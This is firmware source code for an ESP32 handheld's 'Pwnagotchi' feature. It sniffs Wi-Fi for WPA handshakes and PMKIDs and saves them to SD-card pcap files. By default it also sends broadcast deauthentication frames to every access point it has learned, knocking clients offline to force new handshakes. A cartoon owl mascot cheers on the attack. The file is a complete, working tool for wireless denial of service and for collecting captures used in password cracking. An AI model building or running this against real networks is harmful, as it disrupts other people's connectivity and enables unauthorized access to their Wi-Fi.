// ===================================================================
// bySaw Pwnagotchi — passive WPA handshake / PMKID harvester with a face.
//
// Channel-hops 2.4GHz, sniffs in promiscuous mode for EAPOL (0x888E) frames,
// counts handshake messages + PMKIDs, logs raw frames to an SD pcap
// (/pwnagotchi/pwn-*.pcap, DLT_IEEE802_11), and nudges nearby APs with a light
// broadcast-ish deauth (learned BSSIDs from beacons) to elicit handshakes.
// A little pixel face reflects the mood. SELECT exits.
// ===================================================================
#include "config.h"
#include "shared.h"
#include "Pwnagotchi.h"
#include <SD.h>
#include "esp_wifi.h"

extern TFT_eSPI tft;
extern bool feature_exit_requested;
bool featureExitButtonPressed();
bool isButtonPressedEdge(int buttonPin);

namespace Pwnagotchi {

static volatile uint32_t s_eapol = 0;     // EAPOL frames seen (handshake msgs)
static volatile uint32_t s_pmkid = 0;     // EAPOL M1 frames carrying a PMKID
static volatile uint32_t s_packets = 0;   // all frames seen
static uint32_t s_deauths = 0;            // deauth frames sent (active mode)
static uint8_t  s_channel = 1;
static bool     s_active = true;          // active (deauth-assist) vs passive

// learned AP BSSIDs (from beacons) + the channel each was seen on, to target deauth
static uint8_t  s_bssids[32][6];
static uint8_t  s_bssidChan[32];
static uint8_t  s_bssidCount = 0;

// SD pcap
static File     s_pcap;
static bool     s_pcapOpen = false;

// ---- pcap (DLT_IEEE802_11 = 105, no radiotap) ----
static void pcapWriteGlobalHeader() {
  struct __attribute__((packed)) GH {
    uint32_t magic; uint16_t vmaj, vmin; int32_t tz; uint32_t sig, snap, net;
  } gh = {0xa1b2c3d4, 2, 4, 0, 0, 65535, 105};
  s_pcap.write((uint8_t*)&gh, sizeof(gh));
}
static void pcapWriteFrame(const uint8_t* buf, uint16_t len) {
  if (!s_pcapOpen) return;
  struct __attribute__((packed)) RH { uint32_t ts, tus, incl, orig; } rh;
  uint32_t ms = millis();
  rh.ts = ms / 1000; rh.tus = (ms % 1000) * 1000; rh.incl = len; rh.orig = len;
  s_pcap.write((uint8_t*)&rh, sizeof(rh));
  s_pcap.write(buf, len);
}

static void learnBssid(const uint8_t* b, uint8_t chan) {
  for (uint8_t i = 0; i < s_bssidCount; i++)
    if (memcmp(s_bssids[i], b, 6) == 0) { s_bssidChan[i] = chan; return; }
  if (s_bssidCount < 32) { memcpy(s_bssids[s_bssidCount], b, 6); s_bssidChan[s_bssidCount] = chan; s_bssidCount++; }
}

// ---- promiscuous RX: detect EAPOL + learn beacon BSSIDs ----
static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* fr = p->payload;
  const int len = p->rx_ctrl.sig_len;
  if (len < 24) return;
  s_packets++;

  const uint8_t ftype = (fr[0] >> 2) & 0x3;   // 0 mgmt, 1 ctrl, 2 data
  const uint8_t fsub  = (fr[0] >> 4) & 0xF;

  if (ftype == 0 && fsub == 8) {              // beacon -> learn BSSID (addr3) + channel
    learnBssid(fr + 16, p->rx_ctrl.channel);
    return;
  }
  if (ftype != 2) return;                     // only data frames carry EAPOL

  // header is 24, +2 if QoS data (subtypes 8..15)
  int hdr = 24;
  if (fsub & 0x08) hdr += 2;
  // LLC/SNAP (8 bytes): AA AA 03 00 00 00 ETHERTYPE(2)
  if (len < hdr + 8) return;
  const uint8_t* llc = fr + hdr;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (!(llc[6] == 0x88 && llc[7] == 0x8E)) return;   // EAPOL ethertype

  s_eapol++;
  pcapWriteFrame(fr, len);

  // crude PMKID heuristic: EAPOL-Key (type 3) with an RSN PMKID KDE
  // (00 0F AC 04) somewhere in the key data — present in M1 from the AP.
  const uint8_t* eap = llc + 8;
  int eaplen = len - (hdr + 8);
  if (eaplen > 4 && eap[1] == 3) {            // EAPOL-Key
    for (int i = 0; i + 4 < eaplen; i++) {
      if (eap[i] == 0x00 && eap[i + 1] == 0x0F && eap[i + 2] == 0xAC && eap[i + 3] == 0x04) {
        s_pmkid++;
        break;
      }
    }
  }
}

// ---- active deauth-assist: elicit handshakes from APs on the current channel ----
// Raw RX needs MODE_NULL but raw TX needs a started STA interface, so briefly switch
// to STA for the burst, then restore NULL + promiscuous. Only targets APs we learned
// on the current channel (a deauth only reaches its AP's channel).
static void deauthBurst() {
  if (s_bssidCount == 0) return;

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  uint8_t pkt[26] = {
      0xC0, 0x00, 0x00, 0x00,                         // deauth
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // dst = broadcast (all clients)
      0,0,0,0,0,0,                                    // src = bssid
      0,0,0,0,0,0,                                    // bssid
      0x00, 0x00,                                     // seq
      0x07, 0x00 };                                   // reason: class-3 from non-assoc
  for (uint8_t i = 0; i < s_bssidCount; i++) {
    if (s_bssidChan[i] != s_channel) continue;
    memcpy(pkt + 10, s_bssids[i], 6);
    memcpy(pkt + 16, s_bssids[i], 6);
    for (int r = 0; r < 3; r++) {                     // a few bursts per AP
      esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
      s_deauths++;
      delay(1);
    }
  }

  // back to monitor: MODE_NULL + promiscuous on the same channel
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
}

// ---- mascot: a cute WiFi pet with Duolingo-style moods + speech ----
enum Mood { MOOD_SAD, MOOD_HUNT, MOOD_ATTACK, MOOD_HAPPY };

static const char* moodMsg(Mood m, uint8_t i) {
  if (m == MOOD_HAPPY) {
    static const char* a[] = {"GOT IT! <3", "yummy handshake!", "+1 streak!", "nom nom keys"};
    return a[i & 3];
  }
  if (m == MOOD_ATTACK) {
    static const char* a[] = {"DEAUTH!! >:)", "reconnect plz", "kickin clients", "gimme that 4-way"};
    return a[i & 3];
  }
  if (m == MOOD_SAD) {
    static const char* a[] = {"where r the wifis?", "hello? anyone?", "so quiet...", "i'm bored :("};
    return a[i & 3];
  }
  static const char* a[] = {"sniff sniff...", "i smell packets", "c'mon handshake", "hunting..."};
  return a[i & 3];
}

// Duolingo-style green owl mascot.
static const uint16_t OWL_GREEN = 0x5E60;  // ~#58CC02 Duo green
static const uint16_t OWL_DARK  = 0x3C00;  // darker green (brows/wings/outline)
static const uint16_t OWL_BELLY = 0x8F23;  // light belly green
static const uint16_t OWL_BEAK  = 0xFCA0;  // orange beak/feet
static const uint16_t OWL_BEAK2 = 0xC2A0;  // darker lower beak

static void drawOwl(Mood m) {
  const int cx = tft.width() / 2;
  const int top = 28;
  tft.fillRect(0, top - 16, tft.width(), 132, UI_BG);

  // feet
  tft.fillRoundRect(cx - 24, top + 110, 20, 9, 3, OWL_BEAK);
  tft.fillRoundRect(cx + 4, top + 110, 20, 9, 3, OWL_BEAK);
  // wings
  tft.fillRoundRect(cx - 58, top + 44, 18, 46, 9, OWL_DARK);
  tft.fillRoundRect(cx + 40, top + 44, 18, 46, 9, OWL_DARK);
  // ear tufts
  tft.fillTriangle(cx - 36, top + 16, cx - 20, top + 16, cx - 30, top - 6, OWL_GREEN);
  tft.fillTriangle(cx + 20, top + 16, cx + 36, top + 16, cx + 30, top - 6, OWL_GREEN);
  // body (egg)
  tft.fillRoundRect(cx - 47, top + 6, 94, 108, 44, OWL_GREEN);
  // belly
  tft.fillRoundRect(cx - 30, top + 62, 60, 50, 26, OWL_BELLY);

  // eyes (big, touching white discs)
  const int eyR = 25, eyY = top + 34;
  tft.fillCircle(cx - 22, eyY, eyR, TFT_WHITE);
  tft.fillCircle(cx + 22, eyY, eyR, TFT_WHITE);
  tft.drawCircle(cx - 22, eyY, eyR, OWL_DARK);
  tft.drawCircle(cx + 22, eyY, eyR, OWL_DARK);

  // pupils (shift by mood)
  int pdy = (m == MOOD_SAD) ? 7 : (m == MOOD_HAPPY) ? -4 : 0;
  tft.fillCircle(cx - 22, eyY + pdy, 11, TFT_BLACK);
  tft.fillCircle(cx + 22, eyY + pdy, 11, TFT_BLACK);
  tft.fillCircle(cx - 26, eyY - 4 + pdy, 3, TFT_WHITE);
  tft.fillCircle(cx + 18, eyY - 4 + pdy, 3, TFT_WHITE);

  // brows (thick green) per mood
  for (int t = 0; t < 5; t++) {
    int yt = eyY - 22 + t;
    if (m == MOOD_ATTACK) {            // angry  \   /
      tft.drawLine(cx - 42, yt - 4, cx - 8, yt + 6, OWL_DARK);
      tft.drawLine(cx + 8, yt + 6, cx + 42, yt - 4, OWL_DARK);
    } else if (m == MOOD_SAD) {        // worried /   \ .
      tft.drawLine(cx - 42, yt + 6, cx - 8, yt - 4, OWL_DARK);
      tft.drawLine(cx + 8, yt - 4, cx + 42, yt + 6, OWL_DARK);
    } else if (m == MOOD_HAPPY) {      // raised
      tft.drawLine(cx - 40, yt - 2, cx - 10, yt - 6, OWL_DARK);
      tft.drawLine(cx + 10, yt - 6, cx + 40, yt - 2, OWL_DARK);
    }
  }

  // beak (orange) just below the eyes
  const int bky = top + 52;
  if (m == MOOD_HAPPY || m == MOOD_ATTACK) {  // open beak
    tft.fillTriangle(cx - 11, bky, cx + 11, bky, cx, bky + 8, OWL_BEAK);
    tft.fillTriangle(cx - 9, bky + 9, cx + 9, bky + 9, cx, bky + 17, OWL_BEAK2);
  } else {
    tft.fillTriangle(cx - 10, bky, cx + 10, bky, cx, bky + 13, OWL_BEAK);
  }
}

static void drawBubble(const char* msg) {
  const int cx = tft.width() / 2;
  const int y = 140, h = 26, w = tft.width() - 24;
  tft.fillRect(0, y - 8, tft.width(), h + 12, UI_BG);
  tft.fillTriangle(cx - 6, y, cx + 6, y, cx, y - 7, UI_FG);
  tft.fillRoundRect(12, y, w, h, 8, UI_FG);
  tft.drawRoundRect(12, y, w, h, 8, UI_LINE);
  tft.setTextColor(UI_TEXT, UI_FG);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.drawCentreString(msg, cx, y + 9, 1);
}

static void drawStats() {
  const int cx = tft.width() / 2;
  tft.setTextFont(1);
  tft.fillRect(0, 174, tft.width(), 110, UI_BG);
  char l[48];

  // mode badge
  tft.setTextSize(1);
  snprintf(l, sizeof(l), " %s  CH %-2d  APs %d ", s_active ? "ATTACK" : "passive", s_channel,
           s_bssidCount);
  uint16_t badge = s_active ? UI_WARN : UI_FG;
  int bw = tft.textWidth(l) + 4;
  tft.fillRoundRect(cx - bw / 2, 176, bw, 16, 4, badge);
  tft.setTextColor(s_active ? TFT_BLACK : UI_TEXT, badge);
  tft.drawCentreString(l, cx, 180, 1);

  // big capture counters (the "score")
  tft.setTextSize(3);
  tft.setTextColor(UI_ICON, UI_BG);
  snprintf(l, sizeof(l), "%lu", (unsigned long)s_eapol);
  tft.drawCentreString(l, cx - 50, 204, 1);
  tft.setTextColor(UI_OK, UI_BG);
  snprintf(l, sizeof(l), "%lu", (unsigned long)s_pmkid);
  tft.drawCentreString(l, cx + 50, 204, 1);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, UI_BG);
  tft.drawCentreString("HANDSHAKE", cx - 50, 232, 1);
  tft.drawCentreString("PMKID", cx + 50, 232, 1);

  // footer
  tft.setTextColor(UI_DIM_TEXT, UI_BG);
  snprintf(l, sizeof(l), "deauth %lu", (unsigned long)s_deauths);
  tft.drawCentreString(l, cx, 250, 1);
  tft.drawCentreString("UP: mode    SEL: exit", cx, 264, 1);
}

void run() {
  // Stop the boot WiFi/BLE background scanners — they periodically re-scan and
  // clobber our promiscuous mode (without this the sniffer sees 0 packets).
  pauseBackgroundRadioTasks();

  s_eapol = s_pmkid = s_packets = s_deauths = 0;
  s_bssidCount = 0;
  s_channel = 1;

  tft.fillScreen(UI_BG);
  tft.setTextColor(UI_DIM_TEXT, UI_BG);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.drawCentreString("bySaw pwnagotchi", tft.width() / 2, 4, 1);

  // open SD pcap
  if (SD.cardType() != CARD_NONE) {
    SD.mkdir("/pwnagotchi");
    char path[40];
    snprintf(path, sizeof(path), "/pwnagotchi/pwn-%lu.pcap", (unsigned long)(millis() / 1000));
    s_pcap = SD.open(path, FILE_WRITE);
    if (s_pcap) { s_pcapOpen = true; pcapWriteGlobalHeader(); Serial.printf("[pwn] logging %s\n", path); }
  }
  if (!s_pcapOpen) Serial.println("[pwn] no SD — capturing without logging");

  // Match the proven Packet-Monitor sniffer sequence: WiFi is already inited by the
  // boot scanner, so just drop to MODE_NULL (the mode that surfaces raw frames to the
  // promiscuous callback) then enable promiscuous. Logging the esp_err returns so a
  // failure is visible over serial.
  wifi_mode_t wm;
  esp_err_t e_mode = esp_wifi_get_mode(&wm);
  if (e_mode == ESP_ERR_WIFI_NOT_INIT) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
  }
  esp_err_t e_sm = esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  esp_err_t e_pr = esp_wifi_set_promiscuous(true);
  esp_err_t e_ch = esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  Serial.printf("[pwn] wifi: getmode=0x%x setmode=0x%x promisc=0x%x ch=0x%x\n", e_mode, e_sm, e_pr,
                e_ch);

  uint32_t lastHop = 0, lastDraw = 0, lastDeauth = 0, lastLog = 0;
  uint32_t lastEapol = 0, happyUntil = 0, lastMsg = 0;
  Mood lastMood = (Mood)-1;
  uint8_t msgIdx = 0;

  while (!feature_exit_requested && !featureExitButtonPressed()) {
    uint32_t now = millis();

    // channel hop every 1.2s across 1..13
    if (now - lastHop > 1200) {
      s_channel = (s_channel % 13) + 1;
      esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
      lastHop = now;
    }
    // toggle active/passive with UP
    if (isButtonPressedEdge(BTN_UP)) s_active = !s_active;

    // active mode: deauth-assist burst on the current channel (~1.5s cadence)
    if (s_active && now - lastDeauth > 1500) { deauthBurst(); lastDeauth = now; }

    // redraw ~4 Hz; the pet's mood + speech react to captures
    if (now - lastDraw > 250) {
      if (s_eapol != lastEapol) { lastEapol = s_eapol; happyUntil = now + 2800; }
      Mood m = (now < happyUntil) ? MOOD_HAPPY
               : s_active          ? MOOD_ATTACK
               : (s_bssidCount == 0) ? MOOD_SAD
                                     : MOOD_HUNT;
      if (m != lastMood) { drawOwl(m); lastMood = m; lastMsg = 0; }
      if (now - lastMsg > 2600) { drawBubble(moodMsg(m, msgIdx++)); lastMsg = now; }
      drawStats();
      lastDraw = now;
    }

    // periodic serial log (debug visibility)
    if (now - lastLog > 2000) {
      Serial.printf("[pwn] %s ch=%d aps=%d pkts=%lu eapol=%lu pmkid=%lu deauth=%lu heap=%u\n",
                    s_active ? "ATTACK" : "passive", s_channel, s_bssidCount,
                    (unsigned long)s_packets, (unsigned long)s_eapol, (unsigned long)s_pmkid,
                    (unsigned long)s_deauths, ESP.getFreeHeap());
      if (s_pcapOpen) s_pcap.flush();
      lastLog = now;
    }
    delay(10);
  }

  esp_wifi_set_promiscuous(false);
  if (s_pcapOpen) { s_pcap.flush(); s_pcap.close(); s_pcapOpen = false; }
  Serial.printf("[pwn] stopped: eapol=%lu pmkid=%lu\n", (unsigned long)s_eapol,
                (unsigned long)s_pmkid);
}

} // namespace Pwnagotchi
